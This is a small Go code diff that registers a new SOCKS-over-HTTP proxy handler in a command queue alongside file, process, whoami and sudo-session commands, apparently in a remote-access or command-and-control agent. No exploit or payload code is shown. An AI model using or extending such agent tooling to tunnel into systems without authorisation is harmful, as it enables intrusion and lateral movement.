@@ -71,7 +71,7 @@ func NewCommandQueue() *CommandQueue {
 	}
 
 	// Register all core commands using numeric IDs
-	// Cross-platform commands (1-18)
+	// Cross-platform commands (1-19)
 	queue.RegisterHandler(CmdCd, wrapCommand(&CdCommand{}))
 	queue.RegisterHandler(CmdLs, wrapCommand(&LsCommand{}))
 	queue.RegisterHandler(CmdPwd, wrapCommand(&PwdCommand{}))
@@ -90,6 +90,7 @@ func NewCommandQueue() *CommandQueue {
 	queue.RegisterHandler(CmdPs, wrapCommand(&PSCommand{}))
 	queue.RegisterHandler(CmdRm, wrapCommand(&RmCommand{}))
 	queue.RegisterHandler(CmdWhoami, wrapCommand(&WhoamiCommand{}))
+	queue.RegisterHandler(CmdSocksHTTP, wrapCommand(GetSocksHTTPHandler()))
 
 	// Linux/Darwin specific commands (100-101)
 	queue.RegisterHandler(CmdSudoSession, wrapCommand(&SudoSessionCommand{}))
